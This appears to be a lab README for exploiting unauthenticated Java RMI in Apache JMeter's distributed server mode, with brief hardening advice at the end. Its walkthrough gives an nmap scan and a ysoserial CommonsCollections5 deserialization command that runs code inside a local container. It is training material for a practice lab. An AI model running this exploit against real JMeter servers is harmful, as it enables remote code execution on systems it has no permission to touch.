# Apache JMeter Distributed RMI Remote Code Execution

## Overview

Apache JMeter is an open-source load testing tool. When run in distributed server mode (jmeter-server), JMeter exposes a Java Remote Method Invocation (RMI) registry on port 1099 without SSL or authentication. Remote attackers can connect to the RMI endpoint using standard RMI deserialization exploits or JMeter client protocols to execute arbitrary Java code.

- **Service Access**: `http://localhost:8178/`
- **Default Credentials**: `Unauthenticated Java RMI`
- **Docker Shortcut**: `./lab start jmeter-rmi-rce`
- **Container Name**: `cyberlab_04_jmeter_rmi_rce`
- **RAM Footprint**: ~200M

---

## Exploitation Walkthrough

### 1. Check RMI Registry Port

```bash
nmap -sV -p 1099 127.0.0.1
```

### 2. Send Deserialization Gadget via ysoserial Exploit/RMIRegistryExploit

```bash
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 1099 CommonsCollections5 'touch /tmp/pwned_jmeter'
```

### 3. Verify File Creation

```bash
docker exec -it cyberlab_04_jmeter_rmi_rce ls -la /tmp/pwned_jmeter
```

---

## Defensive Remediation & Hardening

1. Enable SSL for RMI connections with server.rmi.ssl.disable=false.
2. Bind JMeter server strictly to internal network interfaces.

---

## Video Walkthroughs & Technical References

- [Full Ethical Hacking Course - Beginner Network Penetration Testing (2019)](https://www.youtube.com/watch?v=WnN6dbos5u8)
- [Apache JMeter Distributed Testing Guide](https://jmeter.apache.org/usermanual/remote-test.html)
- [Vulhub JMeter RMI Environment](https://vulhub.org/#/environments/jmeter/CVE-2018-1297/)
